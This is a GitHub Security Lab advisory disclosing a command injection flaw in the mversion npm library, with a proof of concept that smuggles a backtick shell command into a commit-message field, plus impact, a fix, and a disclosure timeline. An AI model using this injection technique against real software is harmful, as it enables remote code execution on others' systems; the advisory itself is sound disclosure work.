<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">June 24, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-110: Command Injection in mversion</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/kevinbackhouse">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/4358136?s=35" height="35" width="35">
        <span>Kevin Backhouse</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>The <code class="language-plaintext highlighter-rouge">mversion.update</code> function has a command injection vulnerability. Clients of the mversion library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.</p>

<h2 id="product">Product</h2>
<p>mversion</p>

<h2 id="tested-version">Tested Version</h2>
<p>Commit <a href="https://github.com/mikaelbr/mversion/tree/765fbb8b03e37be1e02a6733410c22f1e2c7940e">765fbb8</a></p>

<h2 id="details-command-injection-in-mversionupdate">Details: Command injection in <code class="language-plaintext highlighter-rouge">mversion.update</code></h2>

<p>The following proof-of-concept illustrates the vulnerability. First install mversion and create an empty git repo to run the PoC in:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install mversion
git init
</code></pre></div></div>

<p>Now create a file with the following contents:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">mversion</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mversion</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">fs</span><span class="dl">"</span><span class="p">);</span>

<span class="c1">// setting up a bit of environment</span>
<span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="dl">"</span><span class="s2">package.json</span><span class="dl">"</span><span class="p">,</span> <span class="dl">'</span><span class="s1">{"name": "foo", "version": "1.0.0"}</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">mversion</span><span class="p">.</span><span class="nx">update</span><span class="p">({</span>
    <span class="na">version</span><span class="p">:</span> <span class="dl">'</span><span class="s1">major</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">commitMessage</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Some commit message for version %s `touch exploit`</span><span class="dl">'</span><span class="p">,</span>
    <span class="na">noPrefix</span><span class="p">:</span> <span class="kc">true</span>
  <span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">data</span><span class="p">)</span> <span class="p">{</span> <span class="p">})</span> 
</code></pre></div></div>

<p>and run it:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node test.js
</code></pre></div></div>

<p>Notice that a file named <code class="language-plaintext highlighter-rouge">exploit</code> has been created.</p>

<p>This vulnerability is similar to command injection vulnerabilities that have been found in other Javascript libraries. Here are some examples:
<a href="https://github.com/advisories/GHSA-m8xj-5v73-3hh8">CVE-2020-7646</a>,
<a href="https://github.com/advisories/GHSA-426h-24vj-qwxf">CVE-2020-7614</a>,
<a href="https://github.com/advisories/GHSA-5q88-cjfq-g2mh">CVE-2020-7597</a>,
<a href="https://github.com/advisories/GHSA-4gp3-p7ph-x2jr">CVE-2019-10778</a>,
<a href="https://github.com/advisories/GHSA-84cm-v6jp-gjmr">CVE-2019-10776</a>,
<a href="https://github.com/advisories/GHSA-9jm3-5835-537m">CVE-2018-16462</a>,
<a href="https://github.com/advisories/GHSA-7g2w-6r25-2j7p">CVE-2018-16461</a>,
<a href="https://github.com/advisories/GHSA-cfhg-9x44-78h2">CVE-2018-16460</a>,
<a href="https://github.com/advisories/GHSA-pp57-mqmh-44h7">CVE-2018-13797</a>,
<a href="https://github.com/advisories/GHSA-c9j3-wqph-5xx9">CVE-2018-3786</a>,
<a href="https://github.com/advisories/GHSA-wjr4-2jgw-hmv8">CVE-2018-3772</a>,
<a href="https://github.com/advisories/GHSA-3pxp-6963-46r9">CVE-2018-3746</a>,
<a href="https://github.com/advisories/GHSA-jcw8-r9xm-32c6">CVE-2017-16100</a>,
<a href="https://github.com/advisories/GHSA-qh2h-chj9-jffq">CVE-2017-16042</a>.</p>

<p>We have written a <a href="https://codeql.com">CodeQL</a> query, which automatically detects this vulnerability. You can see the results of the query on the <code class="language-plaintext highlighter-rouge">mversion</code> project <a href="https://lgtm.com/query/2059233003618484586/">here</a>.</p>

<h3 id="impact">Impact</h3>

<p>This issue may lead to remote code execution if a client of the library calls the vulnerable method with untrusted input.</p>

<h3 id="remediation">Remediation</h3>

<p>We recommend not using an API that can interpret a string as a shell command. For example, use <a href="https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback"><code class="language-plaintext highlighter-rouge">child_process.execFile</code></a> instead of <a href="https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback"><code class="language-plaintext highlighter-rouge">child_process.exec</code></a>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated disclosure timeline</h2>

<p>2020-05-19: Emailed report to mikaelbre@gmail.com
2020-06-15: Created an <a href="https://github.com/mikaelbr/mversion/issues/55">issue</a> on their repo.
2020-06-15: They <a href="https://github.com/mikaelbr/mversion/commit/6c76c9efd27c7ff5a5c6f187e8b7a435c4722338">fixed</a> it in v2.0.0.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub Engineer <a href="https://github.com/erik-krogh">@erik-krogh (Erik Krogh Kristensen)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-110</code> in any communication regarding this issue.</p>

    